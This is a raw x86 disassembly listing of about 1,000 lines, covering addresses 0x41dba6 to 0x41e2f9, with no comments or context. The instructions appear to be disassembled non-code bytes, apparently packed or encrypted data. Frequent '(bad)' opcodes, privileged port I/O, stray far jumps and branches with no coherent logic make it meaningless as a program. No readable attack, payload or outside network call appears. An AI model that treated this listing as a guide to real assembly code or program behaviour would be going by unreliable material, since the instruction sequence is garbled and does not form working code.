  41dba6:	push   edx
  41dba7:	pop    esi
  41dba8:	neg    BYTE PTR [ecx+ebp*1+0x4e]
  41dbac:	dec    esp
  41dbad:	push   cs
  41dbae:	(bad)  
  41dbaf:	icebp  
  41dbb0:	xor    bl,bh
  41dbb2:	and    esp,DWORD PTR [esi+0x1e]
  41dbb5:	xor    al,0x76
  41dbb7:	cld    
  41dbb8:	adc    DWORD PTR [esi-0x35c807e9],0x941f2567
  41dbc2:	jb     0x41db81
  41dbc4:	lea    edx,[ebp+0x7ccdf078]
  41dbca:	popa   
  41dbcb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dbcc:	sar    DWORD PTR [edi-0x28],cl
  41dbcf:	pop    ecx
  41dbd0:	lock outs dx,BYTE PTR ds:[esi]
  41dbd2:	mov    ebx,0xf60b10ae
  41dbd7:	pop    ecx
  41dbd8:	pop    edi
  41dbd9:	xchg   esi,eax
  41dbda:	repz sub DWORD PTR [ebp+0x56],esp
  41dbde:	xor    BYTE PTR ds:0x6cc4c3bb,cl
  41dbe4:	retf   0x5207
  41dbe7:	push   ss
  41dbe8:	inc    DWORD PTR [esp+edx*2+0x18fcb82]
  41dbef:	lods   al,BYTE PTR ds:[esi]
  41dbf0:	dec    edi
  41dbf1:	test   al,0xed
  41dbf3:	push   esp
  41dbf4:	push   ebp
  41dbf5:	and    ebp,DWORD PTR [edi-0x4b]
  41dbf8:	mov    edi,0xc6dba9a4
  41dbfd:	repnz add DWORD PTR [bx],esi
  41dc01:	sbb    eax,0x979a61a9
  41dc06:	aas    
  41dc07:	lea    edx,[edx+0x16]
  41dc0a:	cld    
  41dc0b:	or     al,0x24
  41dc0d:	mov    bh,0x86
  41dc0f:	rep lods al,BYTE PTR ds:[esi]
  41dc11:	jno    0x41dc03
  41dc13:	xor    eax,0xfeb306bd
  41dc18:	nop
  41dc19:	sub    eax,0x296caafc
  41dc1e:	sbb    eax,0xf5fdc9d4
  41dc23:	and    eax,0xc65ba2e9
  41dc28:	pop    edx
  41dc29:	icebp  
  41dc2a:	out    0x9,al
  41dc2c:	jo     0x41dbc5
  41dc2e:	pop    es
  41dc2f:	inc    edi
  41dc30:	(bad)  
  41dc32:	mov    bh,0x6a
  41dc34:	sbb    DWORD PTR [esi-0x61],0xffffff8c
  41dc38:	dec    esp
  41dc39:	call   0x335b7b62
  41dc3e:	not    DWORD PTR [ebp-0x6ce4918d]
  41dc44:	cmp    DWORD PTR [ebx],esp
  41dc46:	int3   
  41dc47:	sti    
  41dc48:	sub    eax,edi
  41dc4a:	xlat   BYTE PTR ds:[ebx]
  41dc4b:	inc    edi
  41dc4c:	mov    ds:0x23188561,al
  41dc51:	push   ss
  41dc52:	repz test al,0x46
  41dc55:	dec    eax
  41dc56:	iret   
  41dc57:	and    ebp,DWORD PTR [edi]
  41dc59:	int    0x36
  41dc5b:	dec    esi
  41dc5c:	inc    ebx
  41dc5d:	(bad)  
  41dc5e:	jno    0x41dc87
  41dc60:	fnsave [esi+0x36]
  41dc63:	loope  0x41dc13
  41dc65:	xor    BYTE PTR [eax+0x26017fc9],dl
  41dc6b:	scas   al,BYTE PTR es:[edi]
  41dc6c:	mov    bl,cl
  41dc6e:	stc    
  41dc6f:	dec    BYTE PTR [ecx+edx*2-0x566c3c14]
  41dc76:	and    bh,BYTE PTR [ecx-0xf]
  41dc79:	in     eax,dx
  41dc7a:	lods   al,BYTE PTR ds:[esi]
  41dc7b:	adc    BYTE PTR [ecx+0x4c5718c8],bl
  41dc81:	dec    edi
  41dc82:	mov    DWORD PTR [ebx-0x533f06d],0xfdc5b8a
  41dc8c:	jne    0x41dc88
  41dc8e:	pop    ecx
  41dc8f:	pop    edx
  41dc90:	in     eax,0xd8
  41dc92:	or     eax,0x19130c9
  41dc97:	sub    al,0xea
  41dc99:	or     BYTE PTR [esi],cl
  41dc9b:	test   al,0x1a
  41dc9d:	cmp    al,0x32
  41dc9f:	jo     0x41dcaf
  41dca1:	mov    ah,0xe5
  41dca3:	jns    0x41dc5a
  41dca5:	inc    eax
  41dca6:	lea    edx,[edi+eiz*4-0x1687504f]
  41dcad:	int3   
  41dcae:	pop    ebx
  41dcaf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dcb0:	pop    edx
  41dcb1:	jnp    0x41dcaa
  41dcb3:	(bad)  
  41dcb4:	and    ah,BYTE PTR ds:0xfb14eaef
  41dcba:	xchg   ebp,eax
  41dcbb:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  41dcbd:	sub    eax,0xffffffac
  41dcc0:	xor    esi,DWORD PTR ds:0x23f54569
  41dcc6:	xor    ebx,DWORD PTR ds:0xbd069bba
  41dccc:	stos   BYTE PTR es:[edi],al
  41dccd:	ins    BYTE PTR es:[edi],dx
  41dcce:	push   esi
  41dccf:	push   0x1b
  41dcd1:	dec    esi
  41dcd2:	push   ebp
  41dcd3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dcd4:	inc    eax
  41dcd5:	in     al,0xd6
  41dcd7:	dec    ebx
  41dcd8:	cli    
  41dcd9:	mov    edi,0xeddc4876
  41dcde:	dec    ecx
  41dcdf:	xor    BYTE PTR [ebp-0x7be080c0],ch
  41dce5:	mov    dl,0x94
  41dce7:	in     al,0xaf
  41dce9:	cdq    
  41dcea:	push   ss
  41dceb:	xor    eax,0xbd07e59c
  41dcf0:	sbb    ah,BYTE PTR [ebp+0x23]
  41dcf3:	jl     0x41dd44
  41dcf5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dcf6:	in     al,0xbc
  41dcf8:	jmp    0x41dcc8
  41dcfa:	jl     0x41dc90
  41dcfc:	push   esi
  41dcfd:	pop    edx
  41dcfe:	fisttp WORD PTR [edi+0x2b879349]
  41dd04:	mov    bh,0x2f
  41dd06:	mov    dh,0x39
  41dd08:	inc    esp
  41dd09:	jmp    0xa331:0xc5b19ae0
  41dd10:	jo     0x41dcec
  41dd12:	dec    eax
  41dd13:	test   al,0x62
  41dd15:	and    al,0xac
  41dd17:	dec    ecx
  41dd18:	mov    edi,0xb632ef8b
  41dd1d:	idiv   BYTE PTR [ebx+0x563bf404]
  41dd23:	add    DWORD PTR [esi+0x553bae56],ebp
  41dd29:	xor    cl,BYTE PTR ss:[edi-0x4ed94999]
  41dd30:	sahf   
  41dd31:	pop    edi
  41dd32:	loop   0x41dcd1
  41dd34:	mov    esp,0x822d6b99
  41dd39:	sub    cl,bh
  41dd3b:	addr16 loope 0x41dd80
  41dd3e:	pop    ds
  41dd3f:	dec    esi
  41dd40:	pop    es
  41dd41:	pusha  
  41dd42:	loop   0x41dd0f
  41dd44:	dec    eax
  41dd45:	enter  0x5379,0x39
  41dd49:	xor    esp,DWORD PTR [ecx+0x222512dd]
  41dd4f:	adc    BYTE PTR [edx+0x12],ah
  41dd52:	repz inc esi
  41dd54:	push   cs
  41dd55:	jns    0x41dd47
  41dd57:	out    dx,eax
  41dd58:	and    DWORD PTR [edx+ecx*4+0x3],ecx
  41dd5c:	pusha  
  41dd5d:	and    ebp,DWORD PTR [esi-0x1e]
  41dd60:	dec    edi
  41dd61:	cli    
  41dd62:	bound  esi,QWORD PTR [ebp+0x17]
  41dd65:	int    0x8
  41dd67:	push   ss
  41dd68:	outs   dx,DWORD PTR ds:[esi]
  41dd69:	or     ch,BYTE PTR [eax]
  41dd6b:	mov    ds:0x2860e587,al
  41dd70:	rcl    ecx,1
  41dd72:	mov    edx,esi
  41dd74:	popf   
  41dd75:	pop    edx
  41dd76:	imul   edi,DWORD PTR [ebx],0x204960ec
  41dd7c:	dec    ebp
  41dd7d:	lea    esi,[edx+0x42]
  41dd80:	pop    edx
  41dd81:	(bad)  [ebp+0x7e]
  41dd84:	(bad)  
  41dd85:	jp     0x41dd49
  41dd87:	test   DWORD PTR [ebx+0x2f],esp
  41dd8a:	cmp    ah,0xac
  41dd8d:	sbb    ah,0x72
  41dd90:	mov    al,ds:0x866eeeae
  41dd95:	mov    dh,0x2b
  41dd97:	adc    edi,DWORD PTR [ebx]
  41dd99:	add    DWORD PTR [ebx+0x10ba0890],ecx
  41dd9f:	mov    eax,ds:0x720a8da8
  41dda4:	sub    ebx,0x5f
  41dda7:	ds xor eax,0x437ba470
  41ddad:	pop    ss
  41ddae:	pusha  
  41ddaf:	or     BYTE PTR [esi-0x7],bl
  41ddb2:	cwde   
  41ddb3:	sub    BYTE PTR [ebp+0x47],bl
  41ddb6:	pop    es
  41ddb7:	pushf  
  41ddb8:	mov    WORD PTR [edx],es
  41ddba:	aaa    
  41ddbb:	pusha  
  41ddbc:	dec    edx
  41ddbd:	imul   ebx,DWORD PTR [edi+0x4ee9ca52],0xad437d19
  41ddc7:	enter  0x25b6,0x88
  41ddcb:	in     eax,0x5
  41ddcd:	int    0xfc
  41ddcf:	cmp    al,0x5e
  41ddd1:	retf   
  41ddd2:	or     eax,0xc3e91a3c
  41ddd7:	lds    ebx,FWORD PTR [ebx+ecx*8+0x11]
  41dddb:	out    dx,eax
  41dddc:	repz adc DWORD PTR [ebp-0x4f081850],edi
  41dde3:	shr    BYTE PTR [ebx-0x1df7024a],0x1d
  41ddea:	(bad)  
  41ddeb:	(bad)  
  41dded:	test   ebx,esi
  41ddef:	jg     0x41ddc4
  41ddf1:	out    dx,eax
  41ddf2:	movsx  eax,si
  41ddf5:	popa   
  41ddf6:	scas   eax,DWORD PTR es:[edi]
  41ddf7:	cmp    ebp,eax
  41ddf9:	dec    eax
  41ddfa:	(bad)  
  41ddfc:	rcr    ch,0xc7
  41ddff:	cmp    dl,0x4d
  41de02:	pop    edi
  41de03:	nop
  41de04:	sti    
  41de05:	pop    edi
  41de06:	cs inc esp
  41de08:	jle    0x41ddcd
  41de0a:	(bad)  
  41de0b:	mov    DWORD PTR [ebx+0x5feedf2c],eax
  41de11:	ins    DWORD PTR es:[edi],dx
  41de12:	jle    0x41de12
  41de14:	cs sub dh,ah
  41de17:	mov    ds:0x927d0563,eax
  41de1c:	(bad)  
  41de1d:	jbe    0x41dde0
  41de1f:	loopne 0x41ddcd
  41de21:	pop    ecx
  41de22:	push   cs
  41de23:	ds and eax,0x1f41199
  41de29:	not    DWORD PTR [ebp-0x52]
  41de2c:	or     eax,0x90182acb
  41de31:	aad    0xa0
  41de33:	mov    DWORD PTR [edx+edx*8-0x1ec62cd6],ebp
  41de3a:	out    0xb1,al
  41de3c:	or     BYTE PTR [ebp+0x1a],bl
  41de3f:	and    DWORD PTR [ebx],ebx
  41de41:	sbb    al,0x1
  41de43:	or     ebx,DWORD PTR [edx+0x55]
  41de46:	pop    es
  41de47:	inc    ecx
  41de48:	ins    DWORD PTR es:[edi],dx
  41de49:	in     eax,0xfa
  41de4b:	leave  
  41de4c:	daa    
  41de4d:	cld    
  41de4e:	jo     0x41de00
  41de50:	repnz shr BYTE PTR [ecx+edx*1-0x36],1
  41de55:	syscall 
  41de57:	push   ecx
  41de58:	inc    edx
  41de59:	mov    cs,esi
  41de5b:	into   
  41de5c:	frstor [esi]
  41de5e:	or     DWORD PTR [ebx+ebx*2+0x7347b755],ecx
  41de65:	dec    esp
  41de66:	fdivrp st(3),st
  41de68:	scas   eax,DWORD PTR es:[edi]
  41de69:	fwait
  41de6a:	xor    eax,0x4ec9d285
  41de6f:	add    ecx,eax
  41de71:	mov    dh,0x53
  41de73:	sub    esp,esi
  41de75:	add    eax,0xa1bf856c
  41de7a:	adc    dh,ah
  41de7c:	ins    DWORD PTR es:[edi],dx
  41de7d:	inc    edi
  41de7e:	mov    ds:0x2c255d11,eax
  41de83:	cld    
  41de84:	cmp    ebx,eax
  41de86:	xchg   eax,ebx
  41de88:	push   cs
  41de89:	xchg   esp,eax
  41de8a:	sbb    eax,0x9f4daaa4
  41de8f:	adc    DWORD PTR [edx-0xd5a68e1],eax
  41de95:	xchg   DWORD PTR [edi+0x28a06cc2],ecx
  41de9b:	dec    esp
  41de9c:	pop    edi
  41de9d:	sbb    DWORD PTR [eax+0xf135971],edx
  41dea3:	ins    BYTE PTR es:[edi],dx
  41dea4:	or     edi,0x62
  41dea7:	dec    edi
  41dea8:	pop    ebx
  41dea9:	adc    dh,BYTE PTR [edx-0x5e]
  41deac:	mov    eax,0x6ad0eb86
  41deb1:	das    
  41deb2:	imul   edx,DWORD PTR [edx+ebp*2],0xd5e6615f
  41deb9:	int    0x9
  41debb:	mov    ds:0xe45d3d40,eax
  41dec0:	(bad)  
  41dec1:	cdq    
  41dec2:	arpl   di,ax
  41dec4:	sbb    ebp,ebx
  41dec6:	hlt    
  41dec7:	inc    ebp
  41dec8:	sbb    eax,DWORD PTR [eax+0x719b79ef]
  41dece:	les    ebp,FWORD PTR [eax+0x5a]
  41ded1:	ja     0x41dec9
  41ded3:	jecxz  0x41df33
  41ded5:	or     BYTE PTR [edx-0x2aeaec6c],bl
  41dedb:	mov    cl,0x47
  41dedd:	in     eax,dx
  41dede:	lahf   
  41dedf:	cmp    eax,0x4364439d
  41dee4:	gs mov ecx,0x1120ce8f
  41deea:	push   esp
  41deeb:	idiv   DWORD PTR [ebx+0xf551490]
  41def1:	xlat   BYTE PTR ds:[ebx]
  41def2:	dec    ecx
  41def3:	lock sub eax,0x3f226bee
  41def9:	cmp    eax,DWORD PTR [ebx+0x6cbf86b2]
  41deff:	sbb    BYTE PTR [edi+0x75],dl
  41df02:	and    ebp,DWORD PTR [edi]
  41df04:	cs jnp 0x41deb7
  41df07:	mov    ah,BYTE PTR [edi]
  41df09:	retf   
  41df0a:	inc    ecx
  41df0b:	gs cmc 
  41df0d:	fld    QWORD PTR [eax+esi*1+0x199b3fe1]
  41df14:	or     eax,0xa9be83ac
  41df19:	sub    al,BYTE PTR [eax]
  41df1b:	fadd   st(0),st
  41df1d:	repz pop es
  41df1f:	sbb    eax,0x160a7b14
  41df24:	pop    edi
  41df25:	pop    esp
  41df26:	out    0xa2,eax
  41df28:	nop    DWORD PTR [edx-0x5257642b]
  41df2f:	cmp    eax,0xc618d08
  41df34:	pop    ss
  41df35:	js     0x41df04
  41df37:	pop    ebx
  41df38:	xchg   edx,eax
  41df39:	scas   al,BYTE PTR es:[edi]
  41df3a:	sbb    al,0xb7
  41df3c:	stc    
  41df3d:	mov    BYTE PTR [ebx],dh
  41df3f:	cld    
  41df40:	int    0x8a
  41df42:	adc    DWORD PTR [edi-0xb],eax
  41df45:	das    
  41df46:	dec    ebx
  41df47:	std    
  41df48:	fs hlt 
  41df4a:	in     al,0x7e
  41df4c:	or     al,0xda
  41df4e:	cmp    esi,DWORD PTR [ecx-0x54]
  41df51:	or     eax,DWORD PTR [ecx+eax*1+0x67]
  41df55:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41df56:	mov    cl,0xc1
  41df58:	cmp    DWORD PTR [edx-0x4247f1af],0xffffffbc
  41df5f:	cmp    bl,BYTE PTR [esi]
  41df61:	sbb    al,0x50
  41df63:	xchg   esp,eax
  41df64:	dec    eax
  41df65:	test   BYTE PTR [esp+edi*2-0x55ccc372],0x22
  41df6d:	jl     0x41df55
  41df6f:	add    ah,BYTE PTR [ebp-0x20]
  41df72:	(bad)  
  41df73:	pop    ss
  41df74:	sub    al,BYTE PTR [edi]
  41df76:	adc    ah,BYTE PTR [eax-0x27]
  41df79:	test   al,0x8d
  41df7b:	retf   0xd43
  41df7e:	popa   
  41df7f:	dec    ecx
  41df80:	clc    
  41df81:	out    0xe4,eax
  41df83:	lods   eax,DWORD PTR ds:[esi]
  41df84:	scas   al,BYTE PTR es:[edi]
  41df85:	push   edx
  41df86:	or     BYTE PTR [esi],bh
  41df88:	(bad)  
  41df89:	loope  0x41df9d
  41df8b:	pop    es
  41df8c:	inc    ebx
  41df8d:	inc    esp
  41df8e:	cmp    al,0x7b
  41df90:	jb     0x41dfa9
  41df92:	mov    dl,0xb9
  41df94:	jp     0x41dff6
  41df96:	xchg   dh,ch
  41df98:	lahf   
  41df99:	cmp    al,0x18
  41df9b:	rcr    BYTE PTR fs:[edi],cl
  41df9e:	mov    bh,0x87
  41dfa0:	lahf   
  41dfa1:	fs pop esp
  41dfa3:	ret    
  41dfa4:	jae    0x41df8e
  41dfa6:	out    0x60,eax
  41dfa8:	jbe    0x41df33
  41dfaa:	sub    eax,0x4d0872b3
  41dfaf:	jecxz  0x41e024
  41dfb1:	pop    ebp
  41dfb2:	and    esp,DWORD PTR [edi-0x4f14392a]
  41dfb8:	sbb    DWORD PTR [eax+esi*4+0x671221b1],ecx
  41dfbf:	fstp   TBYTE PTR [eax+0x399eca22]
  41dfc5:	out    0x48,eax
  41dfc7:	in     eax,0xa1
  41dfc9:	mov    ah,0x64
  41dfcb:	scas   al,BYTE PTR es:[edi]
  41dfcc:	mov    edi,0xc80e78e5
  41dfd1:	push   es
  41dfd2:	pop    eax
  41dfd3:	ffree  st(2)
  41dfd5:	push   ebp
  41dfd6:	push   ebx
  41dfd7:	stos   BYTE PTR es:[edi],al
  41dfd8:	stos   DWORD PTR es:[edi],eax
  41dfd9:	sbb    eax,ebp
  41dfdb:	sbb    ah,BYTE PTR [edi+esi*4+0x71]
  41dfdf:	cmp    BYTE PTR [ebp+edi*2-0x6285a91a],0x8f
  41dfe7:	mov    ds:0x6f2b8914,al
  41dfec:	sub    ebx,eax
  41dfee:	sbb    ch,BYTE PTR ds:0x23141b71
  41dff4:	mov    ecx,0xa87a37bc
  41dff9:	lahf   
  41dffa:	ja     0x41dfaf
  41dffc:	mov    edi,0x362b4a39
  41e001:	jns    0x41dfd4
  41e003:	stc    
  41e004:	jo     0x41dfbd
  41e006:	xchg   edi,eax
  41e007:	jbe    0x41dfd0
  41e009:	xchg   BYTE PTR [eax],bl
  41e00b:	push   ds
  41e00c:	sahf   
  41e00d:	add    dl,BYTE PTR [edx-0x695d4110]
  41e013:	xor    ebp,DWORD PTR [edi-0x25e80a2b]
  41e019:	ret    0xee1e
  41e01c:	mov    ecx,0xddb85a03
  41e021:	dec    esp
  41e022:	mov    ebp,0x142e8c40
  41e027:	or     eax,0x2a9f8e05
  41e02c:	test   DWORD PTR [ebx*4+0x12ce26b7],eax
  41e033:	dec    edx
  41e034:	jl     0x41dfe7
  41e036:	xor    eax,0xf8b887a9
  41e03b:	in     eax,0xfa
  41e03d:	out    dx,eax
  41e03e:	mov    ch,0x67
  41e040:	sahf   
  41e041:	sub    dh,BYTE PTR [ebx+edx*4-0x650328b8]
  41e048:	push   ecx
  41e049:	sahf   
  41e04a:	test   al,0xa1
  41e04c:	jmp    0x41e09b
  41e04e:	xchg   ecx,eax
  41e04f:	adc    DWORD PTR [ecx+ebx*1],edi
  41e052:	push   es
  41e053:	cld    
  41e054:	sbb    dh,bh
  41e056:	mov    edi,0xa15fe272
  41e05b:	mov    al,0xed
  41e05d:	jo     0x41e0aa
  41e05f:	dec    ebp
  41e060:	aam    0x57
  41e062:	pushf  
  41e063:	pusha  
  41e064:	idiv   BYTE PTR [esi-0x57bd2e9d]
  41e06a:	retf   
  41e06b:	cmp    eax,esp
  41e06d:	mov    bh,BYTE PTR [esi+eax*4-0xa]
  41e071:	adc    al,0xb7
  41e073:	jnp    0xdca43fd
  41e079:	and    al,0x51
  41e07b:	push   cs
  41e07c:	push   ss
  41e07d:	call   0x3e54:0xae14511d
  41e084:	ret    0xa229
  41e087:	nop
  41e088:	sar    BYTE PTR [esi+0x35276273],1
  41e08e:	push   ebx
  41e08f:	ror    DWORD PTR [ecx+ebx*8],1
  41e092:	mov    eax,0x91edb5a7
  41e097:	daa    
  41e098:	pushf  
  41e099:	add    eax,0xe4295737
  41e09e:	fdiv   DWORD PTR [edi]
  41e0a0:	test   DWORD PTR [esp+ebp*2+0x26],0x2ca86ab7
  41e0a8:	cmc    
  41e0a9:	dec    ecx
  41e0aa:	push   esi
  41e0ab:	and    DWORD PTR ds:0x7e00f208,ebp
  41e0b1:	pop    es
  41e0b2:	add    BYTE PTR [ebp+ebx*8-0x3],ah
  41e0b6:	or     BYTE PTR [ebx],al
  41e0b8:	xchg   ecx,eax
  41e0b9:	(bad)  
  41e0bb:	mov    ecx,0x275c8d12
  41e0c0:	or     BYTE PTR [ecx],bl
  41e0c2:	ja     0x41e07c
  41e0c4:	in     eax,0x84
  41e0c6:	jle    0x41e13a
  41e0c8:	aam    0x4a
  41e0ca:	(bad)  
  41e0cc:	add    ebx,DWORD PTR [ebx]
  41e0ce:	adc    al,0xde
  41e0d0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e0d1:	mul    DWORD PTR [ebx+0x6d11dc38]
  41e0d7:	mov    ah,0x5
  41e0d9:	xchg   ecx,eax
  41e0da:	iret   
  41e0db:	xor    DWORD PTR [edx+edx*1],esp
  41e0de:	push   ss
  41e0df:	jp     0x41e0e2
  41e0e1:	lahf   
  41e0e2:	nop
  41e0e3:	sub    al,0x51
  41e0e5:	test   DWORD PTR [ebp-0x38],edi
  41e0e8:	fwait
  41e0e9:	xchg   ebp,eax
  41e0ea:	cmp    cl,BYTE PTR [edi+0x23]
  41e0ed:	jnp    0x41e080
  41e0ef:	mov    edx,0xbc2c15e4
  41e0f4:	rol    DWORD PTR [ebp-0x72a7de8e],1
  41e0fa:	pop    es
  41e0fb:	pop    edi
  41e0fc:	or     esp,DWORD PTR [ebp+eiz*4+0x23d07a6f]
  41e103:	lahf   
  41e104:	push   ds
  41e105:	adc    dh,BYTE PTR [ecx-0x4e]
  41e108:	pop    ecx
  41e109:	add    BYTE PTR [eax],cl
  41e10b:	pop    eax
  41e10c:	sbb    BYTE PTR [eax+0x1a],ch
  41e10f:	inc    ecx
  41e110:	jae    0x41e14c
  41e112:	jg     0x41e12b
  41e114:	jbe    0x41e0c0
  41e116:	loopne 0x41e0e0
  41e118:	jno    0x41e0c2
  41e11a:	sbb    al,0x76
  41e11c:	(bad)  
  41e11d:	icebp  
  41e11e:	daa    
  41e11f:	fsubr  st(4),st
  41e121:	push   cs
  41e122:	scas   al,BYTE PTR es:[edi]
  41e123:	or     al,0x4a
  41e125:	repz jecxz 0x41e0fc
  41e128:	std    
  41e129:	das    
  41e12a:	test   BYTE PTR [eax+0x2dae8c6f],dl
  41e130:	int3   
  41e131:	mov    bl,0x4
  41e133:	out    0x1d,al
  41e135:	push   esi
  41e136:	retf   
  41e137:	xchg   dl,bl
  41e139:	pop    ss
  41e13a:	out    dx,eax
  41e13b:	sbb    edi,eax
  41e13d:	cmp    eax,0x8bf5867
  41e142:	or     al,0xa6
  41e144:	loopne 0x41e135
  41e146:	xchg   ebp,eax
  41e147:	cmp    eax,0xa97e61cd
  41e14c:	test   al,0x7e
  41e14e:	xchg   ebp,eax
  41e14f:	mov    eax,0x4a00f51d
  41e154:	popa   
  41e155:	inc    eax
  41e156:	xchg   esp,eax
  41e157:	pop    eax
  41e158:	mov    esp,0xedd66039
  41e15d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e15e:	rcl    BYTE PTR [ecx-0x31],0xba
  41e162:	out    dx,al
  41e163:	dec    ebx
  41e164:	lods   al,BYTE PTR ds:[esi]
  41e165:	add    BYTE PTR [eax],ch
  41e167:	loopne 0x41e12c
  41e169:	adc    ecx,DWORD PTR [eax]
  41e16b:	fs sbb eax,0x2a8baa68
  41e171:	fbld   TBYTE PTR [edi-0x30]
  41e174:	ds and edi,ebp
  41e177:	adc    BYTE PTR [eax],dh
  41e179:	in     al,0x33
  41e17b:	cdq    
  41e17c:	mov    al,ds:0xdd029ba8
  41e181:	(bad)
  41e184:	out    dx,al
  41e185:	adc    bh,cl
  41e187:	cdq    
  41e188:	cwde   
  41e189:	into   
  41e18a:	lahf   
  41e18b:	cmc    
  41e18c:	fwait
  41e18d:	outs   dx,DWORD PTR ds:[esi]
  41e18e:	imul   edx
  41e190:	xor    eax,0x4de4ee8b
  41e195:	fidiv  DWORD PTR ds:0x9b0a812b
  41e19b:	mov    WORD PTR [ecx+0x3a27ce2d],gs
  41e1a1:	aaa    
  41e1a2:	add    BYTE PTR [eax-0x49],al
  41e1a5:	xor    cl,bl
  41e1a7:	jmp    0xf5d1f7f9
  41e1ac:	or     eax,0x9631ba05
  41e1b1:	dec    ebp
  41e1b2:	out    0xfb,eax
  41e1b4:	mov    DWORD PTR [esi],ecx
  41e1b6:	dec    eax
  41e1b7:	mov    edx,0xe12bdeb4
  41e1bc:	(bad)  
  41e1be:	sti    
  41e1bf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e1c0:	test   BYTE PTR [esi-0x2eef1c1e],ah
  41e1c6:	aas    
  41e1c7:	fst    QWORD PTR [eax-0x68]
  41e1ca:	pop    edx
  41e1cb:	leave  
  41e1cc:	jge    0x41e1bd
  41e1ce:	adc    BYTE PTR [edx],0x74
  41e1d1:	sub    al,0x91
  41e1d3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e1d4:	jmp    0xb294:0x60089251
  41e1db:	jecxz  0x41e1c7
  41e1dd:	dec    ecx
  41e1de:	jmp    0xea55e61a
  41e1e3:	add    ebx,eax
  41e1e5:	and    eax,DWORD PTR [esi+0x4d]
  41e1e8:	jg     0x41e1f9
  41e1ea:	sub    BYTE PTR [edx-0x6f850791],bh
  41e1f0:	cdq    
  41e1f1:	ins    DWORD PTR es:[edi],dx
  41e1f2:	dec    esp
  41e1f3:	xchg   esp,eax
  41e1f4:	add    eax,0x335cb538
  41e1f9:	jo     0x41e1e4
  41e1fb:	pusha  
  41e1fc:	(bad)  
  41e1fd:	in     al,dx
  41e1fe:	js     0x41e206
  41e200:	test   DWORD PTR [ecx-0x4d55d6bd],esi
  41e206:	xchg   esi,eax
  41e207:	leave  
  41e208:	jg     0x41e22a
  41e20a:	fcomp  QWORD PTR [ebx+0x60]
  41e20d:	xor    bl,ch
  41e20f:	push   esp
  41e210:	test   BYTE PTR [edx+0x5a2e634],ah
  41e216:	mov    ecx,DWORD PTR [ecx]
  41e218:	add    DWORD PTR [edx+edi*8-0x262d2163],edi
  41e21f:	pop    esp
  41e220:	jle    0x41e1a6
  41e222:	xlat   BYTE PTR ds:[ebx]
  41e223:	add    BYTE PTR [edx-0x100630dc],bh
  41e229:	xchg   ch,cl
  41e22b:	pop    esi
  41e22c:	push   esp
  41e22d:	out    dx,eax
  41e22e:	pusha  
  41e22f:	es pop edx
  41e231:	push   ds
  41e232:	es inc edx
  41e234:	sti    
  41e235:	sub    al,0xe9
  41e237:	inc    ecx
  41e238:	(bad)  [edx+0x73b33f16]
  41e23e:	pop    eax
  41e23f:	movzx  ebp,BYTE PTR [ecx+0x2591db2d]
  41e246:	scas   eax,DWORD PTR es:[edi]
  41e247:	xchg   ebp,eax
  41e248:	repnz sub eax,0x4923ab8e
  41e24e:	xchg   ecx,eax
  41e24f:	dec    ebp
  41e250:	into   
  41e251:	lods   al,BYTE PTR ds:[esi]
  41e252:	pop    ds
  41e253:	fs std 
  41e255:	ins    DWORD PTR es:[edi],dx
  41e256:	fcom   st(0)
  41e258:	dec    eax
  41e259:	sub    al,0xd3
  41e25b:	fidivr WORD PTR [edi+eiz*4]
  41e25e:	(bad)  
  41e25f:	(bad)  
  41e260:	push   ebp
  41e261:	repnz loop 0x41e29a
  41e264:	std    
  41e265:	(bad)  
  41e266:	sub    eax,0x6d6ef9b2
  41e26b:	dec    ebx
  41e26c:	add    eax,0x6e89984e
  41e271:	pop    ss
  41e272:	(bad)  
  41e273:	mov    dl,0x74
  41e275:	or     esp,DWORD PTR [edx]
  41e277:	sub    eax,0xbf790d4a
  41e27c:	ins    DWORD PTR es:[edi],dx
  41e27d:	bound  ecx,QWORD PTR [eax]
  41e27f:	lea    esi,[ebp+0x5d93dacd]
  41e285:	pushf  
  41e286:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  41e288:	xchg   edx,eax
  41e289:	jo     0x41e252
  41e28b:	push   esi
  41e28c:	sti    
  41e28d:	push   edx
  41e28e:	aam    0xf3
  41e290:	mov    ds,eax
  41e292:	retf   0xfc6e
  41e295:	push   ecx
  41e296:	mov    ecx,0xcdccc800
  41e29b:	stos   DWORD PTR es:[edi],eax
  41e29c:	jge    0x41e2be
  41e29e:	adc    ebx,DWORD PTR [esi]
  41e2a0:	or     BYTE PTR [esi-0x6eea52cc],al
  41e2a6:	push   ds
  41e2a7:	test   DWORD PTR fs:[esi],esi
  41e2aa:	stc    
  41e2ab:	stos   BYTE PTR es:[edi],al
  41e2ac:	jmp    0x41e2f0
  41e2ae:	pop    ebp
  41e2af:	aaa    
  41e2b0:	fwait
  41e2b1:	inc    ecx
  41e2b2:	popa   
  41e2b3:	sub    dh,BYTE PTR [esi+0xe4ec7b6]
  41e2b9:	jge    0x41e2bb
  41e2bb:	imul   edi,DWORD PTR [eax],0xffffff8c
  41e2be:	retf   
  41e2bf:	add    eax,0x612099cc
  41e2c4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e2c5:	xchg   ebp,eax
  41e2c6:	push   esp
  41e2c7:	push   cs
  41e2c8:	jb     0x41e266
  41e2ca:	fstp   TBYTE PTR [esi+0x4291026d]
  41e2d0:	fidivr DWORD PTR ds:0x9c0ead2
  41e2d6:	sub    ch,BYTE PTR [ecx+0x59f2957f]
  41e2dc:	push   ebx
  41e2dd:	ss loope 0x41e262
  41e2e0:	out    dx,eax
  41e2e1:	daa    
  41e2e2:	jp     0x41e26b
  41e2e4:	xchg   BYTE PTR [edx-0x56dfdcfb],ah
  41e2ea:	(bad)  
  41e2eb:	int3   
  41e2ec:	iret   
  41e2ed:	popa   
  41e2ee:	push   0xffffffb4
  41e2f0:	inc    ecx
  41e2f1:	sub    eax,0x54145a2e
  41e2f6:	xor    ebx,DWORD PTR [edx+0x1f]
  41e2f9:	mov    bl,0xb2
